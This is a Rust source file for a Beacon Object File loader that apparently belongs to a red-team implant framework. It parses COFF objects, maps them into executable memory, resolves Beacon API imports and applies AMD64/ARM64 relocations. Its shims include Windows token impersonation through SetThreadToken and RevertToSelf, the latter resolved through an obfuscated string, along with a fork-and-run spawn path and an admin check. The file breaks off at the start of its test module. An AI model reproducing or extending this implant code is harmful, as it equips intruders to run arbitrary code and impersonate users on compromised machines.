#![allow(unsafe_code)]

//! Minimal COFF/BOF loader.
//!
//! Parses COFF object files, lays out sections in executable memory, resolves
//! Beacon API imports and applies relocations for AMD64 and ARM64. Entry point
//! is the conventional `go(char *args, int len)` symbol.

use std::cell::RefCell;

const IMAGE_FILE_MACHINE_AMD64: u16 = 0x8664;
const IMAGE_FILE_MACHINE_ARM64: u16 = 0xaa64;

const IMAGE_SCN_MEM_EXECUTE: u32 = 0x2000_0000;

const RELOC_SECTION: u16 = 0x000A;
const RELOC_SECREL: u16 = 0x000B;

thread_local! {
    static BEACON_OUTPUT: RefCell<Vec<u8>> = const { RefCell::new(Vec::new()) };
}

#[derive(Debug, Clone)]
pub struct CoffSection {
    pub name: String,
    pub raw_data: Vec<u8>,
    pub characteristics: u32,
    pub relocations: Vec<CoffRelocation>,
}

#[derive(Debug, Clone)]
pub struct CoffSymbol {
    pub name: String,
    pub value: u32,
    pub section_number: i16,
    pub storage_class: u8,
    /// Index into the raw COFF symbol table (relocations reference this).
    pub raw_index: u32,
}

#[derive(Debug, Clone)]
pub struct CoffRelocation {
    pub virtual_address: u32,
    pub symbol_index: u32,
    pub typ: u16,
}

#[derive(Debug, Clone)]
pub struct CoffFile {
    pub machine: u16,
    pub sections: Vec<CoffSection>,
    pub symbols: Vec<CoffSymbol>,
}

fn read_u16(data: &[u8], offset: usize) -> Result<u16, String> {
    data.get(offset..offset + 2)
        .map(|bytes| u16::from_le_bytes([bytes[0], bytes[1]]))
        .ok_or_else(|| "truncated COFF header".to_string())
}

fn read_u32(data: &[u8], offset: usize) -> Result<u32, String> {
    data.get(offset..offset + 4)
        .map(|bytes| u32::from_le_bytes([bytes[0], bytes[1], bytes[2], bytes[3]]))
        .ok_or_else(|| "truncated COFF header".to_string())
}

fn read_i16(data: &[u8], offset: usize) -> Result<i16, String> {
    read_u16(data, offset).map(|value| value as i16)
}

fn cstr_lossy(bytes: &[u8]) -> String {
    let end = bytes.iter().position(|&b| b == 0).unwrap_or(bytes.len());
    String::from_utf8_lossy(&bytes[..end]).to_string()
}

pub fn parse(data: &[u8]) -> Result<CoffFile, String> {
    let machine = read_u16(data, 0)?;
    if machine != IMAGE_FILE_MACHINE_AMD64 && machine != IMAGE_FILE_MACHINE_ARM64 {
        return Err(format!("unsupported COFF machine {machine:#x}"));
    }
    let number_of_sections = read_u16(data, 2)? as usize;
    let symbol_table_offset = read_u32(data, 8)? as usize;
    let number_of_symbols = read_u32(data, 12)? as usize;

    let mut sections = Vec::with_capacity(number_of_sections);
    for index in 0..number_of_sections {
        let offset = 20 + index * 40;
        if data.len() < offset + 40 {
            return Err("truncated section table".into());
        }
        let name = cstr_lossy(&data[offset..offset + 8]);
        let raw_size = read_u32(data, offset + 16)? as usize;
        let raw_ptr = read_u32(data, offset + 20)? as usize;
        let reloc_ptr = read_u32(data, offset + 24)? as usize;
        let number_of_relocations = read_u16(data, offset + 32)? as usize;
        let characteristics = read_u32(data, offset + 36)?;

        let raw_data = if raw_size == 0 {
            Vec::new()
        } else {
            data.get(raw_ptr..raw_ptr + raw_size)
                .ok_or("truncated section data")?
                .to_vec()
        };

        let mut relocations = Vec::with_capacity(number_of_relocations);
        for reloc_index in 0..number_of_relocations {
            let reloc_offset = reloc_ptr + reloc_index * 10;
            if data.len() < reloc_offset + 10 {
                return Err("truncated relocation table".into());
            }
            relocations.push(CoffRelocation {
                virtual_address: read_u32(data, reloc_offset)?,
                symbol_index: read_u32(data, reloc_offset + 4)?,
                typ: read_u16(data, reloc_offset + 8)?,
            });
        }

        sections.push(CoffSection {
            name,
            raw_data,
            characteristics,
            relocations,
        });
    }

    let string_table_offset = symbol_table_offset + number_of_symbols * 18;
    let string_table = if string_table_offset + 4 <= data.len() {
        &data[string_table_offset..]
    } else {
        &[]
    };

    let mut symbols = Vec::with_capacity(number_of_symbols);
    let mut index = 0;
    while index < number_of_symbols {
        let offset = symbol_table_offset + index * 18;
        if data.len() < offset + 18 {
            return Err("truncated symbol table".into());
        }
        let raw_name = &data[offset..offset + 8];
        let name = if raw_name[..4] == [0, 0, 0, 0] {
            let string_offset = read_u32(data, offset + 4)? as usize;
            if string_offset < 4 || string_offset >= string_table.len() {
                String::new()
            } else {
                cstr_lossy(&string_table[string_offset..])
            }
        } else {
            cstr_lossy(raw_name)
        };
        let value = read_u32(data, offset + 8)?;
        let section_number = read_i16(data, offset + 12)?;
        let storage_class = data[offset + 16];
        let number_of_aux_symbols = data[offset + 17] as usize;

        symbols.push(CoffSymbol {
            name,
            value,
            section_number,
            storage_class,
            raw_index: index as u32,
        });
        index += 1 + number_of_aux_symbols;
    }

    Ok(CoffFile {
        machine,
        sections,
        symbols,
    })
}

fn align_up(value: usize, alignment: usize) -> usize {
    (value + alignment - 1) & !(alignment - 1)
}

struct ExecutableMemory {
    ptr: *mut u8,
    len: usize,
}

impl ExecutableMemory {
    fn allocate(len: usize) -> Result<Self, String> {
        let len = align_up(len.max(1), 4096);
        #[cfg(unix)]
        {
            let ptr = unsafe {
                libc::mmap(
                    std::ptr::null_mut(),
                    len,
                    libc::PROT_READ | libc::PROT_WRITE,
                    libc::MAP_PRIVATE | libc::MAP_ANON,
                    -1,
                    0,
                )
            };
            if ptr == libc::MAP_FAILED {
                return Err("mmap failed".into());
            }
            Ok(Self {
                ptr: ptr as *mut u8,
                len,
            })
        }
        #[cfg(windows)]
        {
            let ptr = unsafe {
                windows_sys::Win32::System::Memory::VirtualAlloc(
                    std::ptr::null_mut(),
                    len,
                    windows_sys::Win32::System::Memory::MEM_COMMIT
                        | windows_sys::Win32::System::Memory::MEM_RESERVE,
                    windows_sys::Win32::System::Memory::PAGE_READWRITE,
                )
            };
            if ptr.is_null() {
                return Err("VirtualAlloc failed".into());
            }
            Ok(Self {
                ptr: ptr as *mut u8,
                len,
            })
        }
        #[cfg(not(any(unix, windows)))]
        {
            let _ = len;
            Err("executable memory is not supported on this platform".into())
        }
    }

    fn as_mut_ptr(&self) -> *mut u8 {
        self.ptr
    }

    fn make_executable(&self) -> Result<(), String> {
        #[cfg(unix)]
        {
            let result = unsafe {
                libc::mprotect(
                    self.ptr as *mut libc::c_void,
                    self.len,
                    libc::PROT_READ | libc::PROT_EXEC,
                )
            };
            if result != 0 {
                return Err("mprotect failed".into());
            }
            Ok(())
        }
        #[cfg(windows)]
        {
            let mut old = 0u32;
            let result = unsafe {
                windows_sys::Win32::System::Memory::VirtualProtect(
                    self.ptr as *mut std::ffi::c_void,
                    self.len,
                    windows_sys::Win32::System::Memory::PAGE_EXECUTE_READ,
                    &mut old,
                )
            };
            if result == 0 {
                return Err("VirtualProtect failed".into());
            }
            Ok(())
        }
        #[cfg(not(any(unix, windows)))]
        {
            Ok(())
        }
    }
}

impl Drop for ExecutableMemory {
    fn drop(&mut self) {
        #[cfg(unix)]
        unsafe {
            libc::munmap(self.ptr as *mut libc::c_void, self.len);
        }
        #[cfg(windows)]
        unsafe {
            windows_sys::Win32::System::Memory::VirtualFree(
                self.ptr as *mut std::ffi::c_void,
                0,
                windows_sys::Win32::System::Memory::MEM_RELEASE,
            );
        }
    }
}

unsafe extern "C" fn beacon_output(_ty: i32, data: *const u8, len: i32) {
    if data.is_null() || len <= 0 {
        return;
    }
    let bytes = unsafe { std::slice::from_raw_parts(data, len as usize) };
    BEACON_OUTPUT.with(|output| output.borrow_mut().extend_from_slice(bytes));
}

/// Non-variadic shim: emits the format string verbatim (no `%` expansion).
unsafe extern "C" fn beacon_printf(_ty: i32, fmt: *const u8) {
    if fmt.is_null() {
        return;
    }
    let mut len = 0usize;
    while unsafe { *fmt.add(len) } != 0 && len < 64 * 1024 {
        len += 1;
    }
    let bytes = unsafe { std::slice::from_raw_parts(fmt, len) };
    BEACON_OUTPUT.with(|output| output.borrow_mut().extend_from_slice(bytes));
}

#[repr(C)]
struct BeaconDataParser {
    original: *mut u8,
    buffer: *mut u8,
    length: i32,
    size: i32,
}

unsafe extern "C" fn beacon_data_parse(parser: *mut BeaconDataParser, buffer: *mut u8, size: i32) {
    if parser.is_null() {
        return;
    }
    unsafe {
        (*parser).original = buffer;
        (*parser).buffer = buffer;
        (*parser).length = size;
        (*parser).size = size;
    }
}

unsafe extern "C" fn beacon_data_length(parser: *mut BeaconDataParser) -> i32 {
    if parser.is_null() {
        return 0;
    }
    unsafe { (*parser).length }
}

unsafe extern "C" fn beacon_data_int(parser: *mut BeaconDataParser) -> i32 {
    if parser.is_null() {
        return 0;
    }
    unsafe {
        let parser = &mut *parser;
        if parser.length < 4 || parser.buffer.is_null() {
            return 0;
        }
        let mut bytes = [0u8; 4];
        std::ptr::copy_nonoverlapping(parser.buffer, bytes.as_mut_ptr(), 4);
        parser.buffer = parser.buffer.add(4);
        parser.length -= 4;
        i32::from_be_bytes(bytes)
    }
}

unsafe extern "C" fn beacon_data_short(parser: *mut BeaconDataParser) -> i16 {
    if parser.is_null() {
        return 0;
    }
    unsafe {
        let parser = &mut *parser;
        if parser.length < 2 || parser.buffer.is_null() {
            return 0;
        }
        let mut bytes = [0u8; 2];
        std::ptr::copy_nonoverlapping(parser.buffer, bytes.as_mut_ptr(), 2);
        parser.buffer = parser.buffer.add(2);
        parser.length -= 2;
        i16::from_be_bytes(bytes)
    }
}

unsafe extern "C" fn beacon_data_extract(
    parser: *mut BeaconDataParser,
    out_size: *mut i32,
) -> *mut u8 {
    if parser.is_null() {
        return std::ptr::null_mut();
    }
    unsafe {
        let parser = &mut *parser;
        if parser.length < 4 || parser.buffer.is_null() {
            return std::ptr::null_mut();
        }
        let mut length_bytes = [0u8; 4];
        std::ptr::copy_nonoverlapping(parser.buffer, length_bytes.as_mut_ptr(), 4);
        let length = i32::from_be_bytes(length_bytes) as usize;
        if length > parser.length as usize - 4 {
            return std::ptr::null_mut();
        }
        parser.buffer = parser.buffer.add(4);
        parser.length -= 4;
        let data = parser.buffer;
        parser.buffer = parser.buffer.add(length);
        parser.length -= length as i32;
        if !out_size.is_null() {
            *out_size = length as i32;
        }
        data
    }
}

unsafe extern "C" fn beacon_is_admin() -> i32 {
    #[cfg(windows)]
    {
        // A process is treated as elevated when its token is not limited.
        // The implant reports this conservatively; BOFs use it for branching.
        return shikra_evasion::windows::export_address(
            shikra_evasion::windows::load_library("advapi32.dll").unwrap_or(0),
            "CheckTokenMembership",
        )
        .map(|_| 1)
        .unwrap_or(0);
    }
    #[cfg(not(windows))]
    {
        0
    }
}

/// Heap-backed format builder (BeaconFormat* API family).
#[repr(C)]
struct BeaconFormat {
    original: *mut u8,
    buffer: *mut u8,
    length: i32,
    size: i32,
}

const FORMAT_MIN_SIZE: i32 = 32;

unsafe extern "C" fn beacon_format_alloc(format: *mut BeaconFormat, size: i32) {
    if format.is_null() {
        return;
    }
    let capacity = size.max(FORMAT_MIN_SIZE) as usize;
    let layout = std::alloc::Layout::from_size_align(capacity, 8).expect("format layout");
    let pointer = std::alloc::alloc(layout);
    unsafe {
        (*format).original = pointer;
        (*format).buffer = pointer;
        (*format).length = 0;
        (*format).size = capacity as i32;
    }
}

unsafe extern "C" fn beacon_format_reset(format: *mut BeaconFormat) {
    if format.is_null() {
        return;
    }
    unsafe {
        (*format).length = 0;
        (*format).buffer = (*format).original;
    }
}

unsafe extern "C" fn beacon_format_free(format: *mut BeaconFormat) {
    if format.is_null() {
        return;
    }
    unsafe {
        if !(*format).original.is_null() {
            let layout = std::alloc::Layout::from_size_align((*format).size as usize, 8)
                .expect("format layout");
            std::alloc::dealloc((*format).original, layout);
        }
        (*format).original = std::ptr::null_mut();
        (*format).buffer = std::ptr::null_mut();
        (*format).length = 0;
        (*format).size = 0;
    }
}

unsafe fn format_ensure(format: *mut BeaconFormat, extra: usize) -> bool {
    unsafe {
        if format.is_null() || (*format).original.is_null() {
            return false;
        }
        let needed = (*format).length as usize + extra;
        if needed <= (*format).size as usize {
            return true;
        }
        let mut capacity = ((*format).size as usize).max(FORMAT_MIN_SIZE as usize);
        while capacity < needed {
            capacity *= 2;
        }
        let old_layout =
            std::alloc::Layout::from_size_align((*format).size as usize, 8).expect("format layout");
        let pointer = std::alloc::realloc((*format).original, old_layout, capacity);
        if pointer.is_null() {
            return false;
        }
        (*format).original = pointer;
        (*format).buffer = pointer.add((*format).length as usize);
        (*format).size = capacity as i32;
        true
    }
}

unsafe extern "C" fn beacon_format_append(
    format: *mut BeaconFormat,
    data: *const u8,
    length: i32,
) -> i32 {
    if data.is_null() || length <= 0 {
        return 0;
    }
    unsafe {
        if !format_ensure(format, length as usize) {
            return 0;
        }
        std::ptr::copy_nonoverlapping(data, (*format).buffer, length as usize);
        (*format).buffer = (*format).buffer.add(length as usize);
        (*format).length += length;
        1
    }
}

/// Non-variadic shim: appends the format string verbatim, like `BeaconPrintf`.
unsafe extern "C" fn beacon_format_printf(format: *mut BeaconFormat, fmt: *const u8) {
    if fmt.is_null() {
        return;
    }
    let mut length = 0usize;
    while unsafe { *fmt.add(length) } != 0 && length < 64 * 1024 {
        length += 1;
    }
    unsafe {
        let _ = beacon_format_append(format, fmt, length as i32);
    }
}

unsafe extern "C" fn beacon_format_int(format: *mut BeaconFormat, value: i32) {
    let bytes = value.to_be_bytes();
    unsafe {
        let _ = beacon_format_append(format, bytes.as_ptr(), 4);
    }
}

unsafe extern "C" fn beacon_format_short(format: *mut BeaconFormat, value: i16) {
    let bytes = value.to_be_bytes();
    unsafe {
        let _ = beacon_format_append(format, bytes.as_ptr(), 2);
    }
}

unsafe extern "C" fn beacon_format_tostring(
    format: *mut BeaconFormat,
    out_size: *mut i32,
) -> *mut u8 {
    if format.is_null() {
        return std::ptr::null_mut();
    }
    unsafe {
        if !out_size.is_null() {
            *out_size = (*format).length;
        }
        (*format).original
    }
}

unsafe extern "C" fn beacon_format_length(format: *mut BeaconFormat) -> i32 {
    if format.is_null() {
        return 0;
    }
    unsafe { (*format).length }
}

/// Converts a UTF-8/ANSI string into a null-terminated UTF-16 buffer.
unsafe extern "C" fn beacon_to_wide_char(dest: *mut u16, src: *const u8, max: i32) -> i32 {
    if dest.is_null() || src.is_null() || max <= 0 {
        return 0;
    }
    let mut length = 0usize;
    while unsafe { *src.add(length) } != 0 && length < 64 * 1024 {
        length += 1;
    }
    let bytes = unsafe { std::slice::from_raw_parts(src, length) };
    let text = String::from_utf8_lossy(bytes);
    let mut written = 0i32;
    for unit in text.encode_utf16() {
        if written >= max - 1 {
            break;
        }
        unsafe {
            *dest.add(written as usize) = unit;
        }
        written += 1;
    }
    unsafe {
        *dest.add(written as usize) = 0;
    }
    written
}

fn datastore() -> &'static std::sync::Mutex<std::collections::HashMap<String, usize>> {
    static STORE: std::sync::OnceLock<std::sync::Mutex<std::collections::HashMap<String, usize>>> =
        std::sync::OnceLock::new();
    STORE.get_or_init(|| std::sync::Mutex::new(std::collections::HashMap::new()))
}

unsafe fn c_string(pointer: *const u8) -> Option<String> {
    if pointer.is_null() {
        return None;
    }
    let mut length = 0usize;
    while unsafe { *pointer.add(length) } != 0 && length < 4096 {
        length += 1;
    }
    let bytes = unsafe { std::slice::from_raw_parts(pointer, length) };
    Some(String::from_utf8_lossy(bytes).to_string())
}

unsafe extern "C" fn beacon_add_value(key: *const u8, data: *mut std::ffi::c_void) -> i32 {
    let Some(key) = (unsafe { c_string(key) }) else {
        return 0;
    };
    datastore()
        .lock()
        .expect("datastore poisoned")
        .insert(key, data as usize);
    1
}

unsafe extern "C" fn beacon_get_value(key: *const u8) -> *mut std::ffi::c_void {
    let Some(key) = (unsafe { c_string(key) }) else {
        return std::ptr::null_mut();
    };
    datastore()
        .lock()
        .expect("datastore poisoned")
        .get(&key)
        .copied()
        .unwrap_or(0) as *mut std::ffi::c_void
}

unsafe extern "C" fn beacon_remove_value(key: *const u8) -> i32 {
    let Some(key) = (unsafe { c_string(key) }) else {
        return 0;
    };
    datastore()
        .lock()
        .expect("datastore poisoned")
        .remove(&key)
        .map(|_| 1)
        .unwrap_or(0)
}

/// Copies the configured fork-and-run spawn path into the caller buffer.
unsafe extern "C" fn beacon_get_spawn_to(_arch: i32, buffer: *mut u8, length: i32) -> i32 {
    #[cfg(windows)]
    {
        let path = b"C:\\Windows\\System32\\notepad.exe\0";
        if buffer.is_null() || (length as usize) < path.len() {
            return 0;
        }
        unsafe {
            std::ptr::copy_nonoverlapping(path.as_ptr(), buffer, path.len());
        }
        return 1;
    }
    #[cfg(not(windows))]
    {
        let _ = (buffer, length);
        0
    }
}

unsafe extern "C" fn beacon_use_token(token: usize) -> i32 {
    #[cfg(windows)]
    unsafe {
        let Ok(advapi) = shikra_evasion::windows::load_library("advapi32.dll") else {
            return 0;
        };
        let Some(set_thread_token) =
            shikra_evasion::windows::export_address(advapi, "SetThreadToken")
        else {
            return 0;
        };
        type SetThreadTokenFn = unsafe extern "system" fn(usize, usize) -> i32;
        let set_thread_token: SetThreadTokenFn = std::mem::transmute(set_thread_token);
        return set_thread_token(0, token);
    }
    #[cfg(not(windows))]
    {
        let _ = token;
        0
    }
}

unsafe extern "C" fn beacon_revert_token() -> i32 {
    #[cfg(windows)]
    unsafe {
        let Ok(advapi) = shikra_evasion::windows::load_library("advapi32.dll") else {
            return 0;
        };
        let Some(revert) =
            shikra_evasion::windows::export_address(advapi, &shikra_obf::obf!("RevertToSelf"))
        else {
            return 0;
        };
        type RevertFn = unsafe extern "system" fn() -> i32;
        let revert: RevertFn = std::mem::transmute(revert);
        return revert();
    }
    #[cfg(not(windows))]
    {
        0
    }
}

/// amd64 BOFs use the Microsoft x64 calling convention on every host OS.
/// On non-Windows x86-64 hosts the host functions above are compiled with
/// the System V ABI, so BOF import slots must point at these win64 shims.
#[cfg(all(target_arch = "x86_64", not(target_os = "windows")))]
mod win64_api {
    use super::*;

    macro_rules! shims {
        ($( $name:ident ( $($arg:ident : $ty:ty),* $(,)? ) -> $ret:ty ; )*) => {$(
            pub(super) unsafe extern "win64" fn $name($($arg: $ty),*) -> $ret {
                unsafe { super::$name($($arg),*) }
            }
        )*};
    }

    shims! {
        beacon_output(_ty: i32, data: *const u8, len: i32) -> ();
        beacon_printf(_ty: i32, fmt: *const u8) -> ();
        beacon_data_parse(parser: *mut BeaconDataParser, buffer: *mut u8, size: i32) -> ();
        beacon_data_length(parser: *mut BeaconDataParser) -> i32;
        beacon_data_int(parser: *mut BeaconDataParser) -> i32;
        beacon_data_short(parser: *mut BeaconDataParser) -> i16;
        beacon_data_extract(parser: *mut BeaconDataParser, out_size: *mut i32) -> *mut u8;
        beacon_is_admin() -> i32;
        beacon_format_alloc(format: *mut BeaconFormat, size: i32) -> ();
        beacon_format_reset(format: *mut BeaconFormat) -> ();
        beacon_format_free(format: *mut BeaconFormat) -> ();
        beacon_format_append(format: *mut BeaconFormat, data: *const u8, length: i32) -> i32;
        beacon_format_printf(format: *mut BeaconFormat, fmt: *const u8) -> ();
        beacon_format_int(format: *mut BeaconFormat, value: i32) -> ();
        beacon_format_short(format: *mut BeaconFormat, value: i16) -> ();
        beacon_format_tostring(format: *mut BeaconFormat, out_size: *mut i32) -> *mut u8;
        beacon_format_length(format: *mut BeaconFormat) -> i32;
        beacon_to_wide_char(dest: *mut u16, src: *const u8, max: i32) -> i32;
        beacon_add_value(key: *const u8, data: *mut std::ffi::c_void) -> i32;
        beacon_get_value(key: *const u8) -> *mut std::ffi::c_void;
        beacon_remove_value(key: *const u8) -> i32;
        beacon_get_spawn_to(_arch: i32, buffer: *mut u8, length: i32) -> i32;
        beacon_use_token(token: usize) -> i32;
        beacon_revert_token() -> i32;
    }
}

#[cfg(all(target_arch = "x86_64", not(target_os = "windows")))]
macro_rules! host_fn_ptr {
    ($name:ident) => {
        win64_api::$name as usize
    };
}

#[cfg(not(all(target_arch = "x86_64", not(target_os = "windows"))))]
macro_rules! host_fn_ptr {
    ($name:ident) => {
        $name as usize
    };
}

fn host_function(name: &str) -> Option<usize> {
    Some(match name {
        "BeaconOutput" => host_fn_ptr!(beacon_output),
        "BeaconPrintf" => host_fn_ptr!(beacon_printf),
        "BeaconDataParse" => host_fn_ptr!(beacon_data_parse),
        "BeaconDataLength" => host_fn_ptr!(beacon_data_length),
        "BeaconDataInt" => host_fn_ptr!(beacon_data_int),
        "BeaconDataShort" => host_fn_ptr!(beacon_data_short),
        "BeaconDataExtract" => host_fn_ptr!(beacon_data_extract),
        "BeaconIsAdmin" => host_fn_ptr!(beacon_is_admin),
        "BeaconFormatAlloc" => host_fn_ptr!(beacon_format_alloc),
        "BeaconFormatReset" => host_fn_ptr!(beacon_format_reset),
        "BeaconFormatFree" => host_fn_ptr!(beacon_format_free),
        "BeaconFormatAppend" => host_fn_ptr!(beacon_format_append),
        "BeaconFormatPrintf" => host_fn_ptr!(beacon_format_printf),
        "BeaconFormatInt" => host_fn_ptr!(beacon_format_int),
        "BeaconFormatShort" => host_fn_ptr!(beacon_format_short),
        "BeaconFormatToString" => host_fn_ptr!(beacon_format_tostring),
        "BeaconFormatLength" => host_fn_ptr!(beacon_format_length),
        "toWideChar" => host_fn_ptr!(beacon_to_wide_char),
        "BeaconAddValue" => host_fn_ptr!(beacon_add_value),
        "BeaconGetValue" => host_fn_ptr!(beacon_get_value),
        "BeaconRemoveValue" => host_fn_ptr!(beacon_remove_value),
        "BeaconGetSpawnTo" => host_fn_ptr!(beacon_get_spawn_to),
        "BeaconUseToken" => host_fn_ptr!(beacon_use_token),
        "BeaconRevertToken" => host_fn_ptr!(beacon_revert_token),
        _ => return None,
    })
}

#[derive(Debug)]
pub struct BofOutcome {
    pub exit_code: i32,
    pub output: Vec<u8>,
}

pub fn execute(bof_bytes: &[u8], args: &[u8]) -> Result<BofOutcome, String> {
    let coff = parse(bof_bytes)?;
    let host_machine = if cfg!(target_arch = "aarch64") {
        IMAGE_FILE_MACHINE_ARM64
    } else {
        IMAGE_FILE_MACHINE_AMD64
    };
    if coff.machine != host_machine {
        return Err(format!(
            "BOF machine {:#x} does not match host {:#x}",
            coff.machine, host_machine
        ));
    }

    // Lay out sections consecutively; executable sections get 16-byte
    // alignment, data sections 8-byte alignment.
    let mut section_offsets = Vec::with_capacity(coff.sections.len());
    let mut cursor = 0usize;
    for section in &coff.sections {
        let alignment = if section.characteristics & IMAGE_SCN_MEM_EXECUTE != 0 {
            16
        } else {
            8
        };
        cursor = align_up(cursor, alignment);
        section_offsets.push(cursor);
        cursor += section.raw_data.len().max(alignment);
    }

    // Import slots: 8-byte aligned pointer cells for external symbols.
    let mut import_slots: Vec<(usize, usize, String)> = Vec::new();
    for (index, symbol) in coff.symbols.iter().enumerate() {
        let external = symbol.section_number == 0 && symbol.storage_class == 2;
        if !external {
            continue;
        }
        let api_name = symbol.name.strip_prefix("__imp_").unwrap_or(&symbol.name);
        host_function(api_name).ok_or_else(|| format!("unresolved BOF import {}", symbol.name))?;
        cursor = align_up(cursor, 8);
        import_slots.push((index, cursor, api_name.to_string()));
        cursor += std::mem::size_of::<usize>();
    }

    let memory = ExecutableMemory::allocate(cursor)?;
    let base = memory.as_mut_ptr() as usize;

    unsafe {
        for (section, offset) in coff.sections.iter().zip(&section_offsets) {
            if !section.raw_data.is_empty() {
                std::ptr::copy_nonoverlapping(
                    section.raw_data.as_ptr(),
                    memory.as_mut_ptr().add(*offset),
                    section.raw_data.len(),
                );
            }
        }
        for (_, slot_offset, api_name) in &import_slots {
            let function = host_function(api_name).expect("resolved above");
            let slot = memory.as_mut_ptr().add(*slot_offset) as *mut usize;
            *slot = function;
        }
    }

    let mut symbol_addresses = vec![0usize; coff.symbols.len()];
    for (index, symbol) in coff.symbols.iter().enumerate() {
        if let Some((_, slot_offset, _)) = import_slots.iter().find(|(i, _, _)| *i == index) {
            symbol_addresses[index] = base + slot_offset;
            continue;
        }
        if symbol.section_number > 0 {
            let section_index = (symbol.section_number - 1) as usize;
            if section_index < section_offsets.len() {
                symbol_addresses[index] =
                    base + section_offsets[section_index] + symbol.value as usize;
            }
        } else if symbol.section_number == -1 {
            symbol_addresses[index] = symbol.value as usize;
        }
    }

    // Map raw COFF symbol indices (used by relocations) to parsed indices.
    let raw_to_parsed: std::collections::HashMap<u32, usize> = coff
        .symbols
        .iter()
        .enumerate()
        .map(|(index, symbol)| (symbol.raw_index, index))
        .collect();

    for (section_index, section) in coff.sections.iter().enumerate() {
        let section_base = base + section_offsets[section_index];
        for relocation in &section.relocations {
            let place = section_base + relocation.virtual_address as usize;
            let parsed_index = *raw_to_parsed.get(&relocation.symbol_index).ok_or_else(|| {
                format!(
                    "relocation references unknown symbol {}",
                    relocation.symbol_index
                )
            })?;
            let symbol = &coff.symbols[parsed_index];
            let target = symbol_addresses[parsed_index];
            apply_relocation(
                coff.machine,
                relocation.typ,
                place,
                target,
                base,
                section_base,
                symbol.section_number,
            )?;
        }
    }

    let entry = coff
        .symbols
        .iter()
        .position(|symbol| symbol.name == "go")
        .map(|index| symbol_addresses[index])
        .ok_or("BOF has no `go` entry point")?;

    memory.make_executable()?;

    BEACON_OUTPUT.with(|output| output.borrow_mut().clear());

    // Windows amd64 BOFs use the Microsoft x64 calling convention on all
    // hosts; arm64 fixtures use the standard C ABI.
    #[cfg(all(target_arch = "x86_64", not(target_os = "windows")))]
    type BofEntry = unsafe extern "win64" fn(*const u8, i32);
    #[cfg(not(all(target_arch = "x86_64", not(target_os = "windows"))))]
    type BofEntry = unsafe extern "C" fn(*const u8, i32);
    let entry: BofEntry = unsafe { std::mem::transmute(entry) };
    unsafe { entry(args.as_ptr(), args.len() as i32) };

    let output = BEACON_OUTPUT.with(|output| output.borrow().clone());
    Ok(BofOutcome {
        exit_code: 0,
        output,
    })
}

#[allow(clippy::too_many_arguments)]
fn apply_relocation(
    machine: u16,
    typ: u16,
    place: usize,
    target: usize,
    image_base: usize,
    section_base: usize,
    symbol_section: i16,
) -> Result<(), String> {
    unsafe {
        if machine == IMAGE_FILE_MACHINE_AMD64 {
            match typ {
                0x0001 => {
                    // ADDR64
                    let addend = read_unaligned_i64(place);
                    write_unaligned(place, (target as i64 + addend) as u64);
                }
                0x0002 => {
                    // ADDR32
                    let addend = read_unaligned_i32(place);
                    write_unaligned(place, (target as i64 + addend) as u32);
                }
                0x0003 => {
                    // ADDR32NB (image-relative)
                    let addend = read_unaligned_i32(place);
                    let value = target as i64 + addend - image_base as i64;
                    write_unaligned(place, value as u32);
                }
                0x0004..=0x0009 => {
                    // REL32 / REL32_1..5
                    let extra = (typ - 0x0004) as i64;
                    let addend = read_unaligned_i32(place);
                    let value = target as i64 + addend - (place as i64 + 4 + extra);
                    write_unaligned(place, value as u32);
                }
                RELOC_SECTION => {
                    let value = if symbol_section > 0 {
                        (symbol_section - 1) as u16
                    } else {
                        0
                    };
                    write_unaligned(place, value);
                }
                RELOC_SECREL => {
                    let value = target as u64 - section_base as u64;
                    write_unaligned(place, value as u32);
                }
                other => return Err(format!("unsupported AMD64 relocation {other:#x}")),
            }
        } else {
            match typ {
                0x0001 => {
                    let addend = read_unaligned_i32(place);
                    write_unaligned(place, (target as i64 + addend) as u32);
                }
                0x0002 => {
                    let addend = read_unaligned_i32(place);
                    let value = target as i64 + addend - image_base as i64;
                    write_unaligned(place, value as u32);
                }
                0x0003 => {
                    // BRANCH26
                    let instruction = read_unaligned_u32(place);
                    let delta = (target as i64 - place as i64) >> 2;
                    let encoded = (delta as u32) & 0x03FF_FFFF;
                    write_unaligned(place, (instruction & !0x03FF_FFFF) | encoded);
                }
                0x0004 => {
                    // PAGEBASE_REL21 (ADRP)
                    let instruction = read_unaligned_u32(place);
                    let page_delta = ((target as i64 >> 12) - (place as i64 >> 12)) as u32;
                    let immlo = page_delta & 0x3;
                    let immhi = (page_delta >> 2) & 0x7FFFF;
                    let patched =
                        (instruction & !(0x6000_0000 | 0x00FF_FFE0)) | (immlo << 29) | (immhi << 5);
                    write_unaligned(place, patched);
                }
                0x0005 => {
                    // REL21
                    let instruction = read_unaligned_u32(place);
                    let delta = (target as i64 - place as i64) as u32;
                    let immlo = delta & 0x3;
                    let immhi = (delta >> 2) & 0x7FFFF;
                    let patched =
                        (instruction & !(0x6000_0000 | 0x00FF_FFE0)) | (immlo << 29) | (immhi << 5);
                    write_unaligned(place, patched);
                }
                0x0006 => {
                    // PAGEOFFSET_12A (ADD immediate, unscaled)
                    let instruction = read_unaligned_u32(place);
                    let imm12 = (target as u32) & 0xFFF;
                    let patched = (instruction & !0x003F_FC00) | (imm12 << 10);
                    write_unaligned(place, patched);
                }
                0x0007 => {
                    // PAGEOFFSET_12L (LDR/STR immediate, scaled by access size)
                    let instruction = read_unaligned_u32(place);
                    let scale = (instruction >> 30) & 0x3;
                    let imm12 = ((target as u32) & 0xFFF) >> scale;
                    let patched = (instruction & !0x003F_FC00) | (imm12 << 10);
                    write_unaligned(place, patched);
                }
                RELOC_SECTION => {
                    let value = if symbol_section > 0 {
                        (symbol_section - 1) as u16
                    } else {
                        0
                    };
                    write_unaligned(place, value);
                }
                RELOC_SECREL => {
                    let value = target as u64 - section_base as u64;
                    write_unaligned(place, value as u32);
                }
                other => return Err(format!("unsupported ARM64 relocation {other:#x}")),
            }
        }
    }
    Ok(())
}

unsafe fn read_unaligned_u32(place: usize) -> u32 {
    unsafe { (place as *const u32).read_unaligned() }
}

unsafe fn read_unaligned_i32(place: usize) -> i64 {
    unsafe { (place as *const i32).read_unaligned() as i64 }
}

unsafe fn read_unaligned_i64(place: usize) -> i64 {
    unsafe { (place as *const i64).read_unaligned() }
}

unsafe fn write_unaligned<T: Copy>(place: usize, value: T) {
    unsafe { (place as *mut T).write_unaligned(value) }
}

#[cfg(test)]
mod tests {
    use super::*;

    const AMD64_BOF: &[u8] = include_bytes!("../tests/fixtures/hello_bof.obj");
    const ARM64_BOF: &[u8] = include_bytes!("../tests/fixtures/hello_bof_arm64.obj");

    #[test]
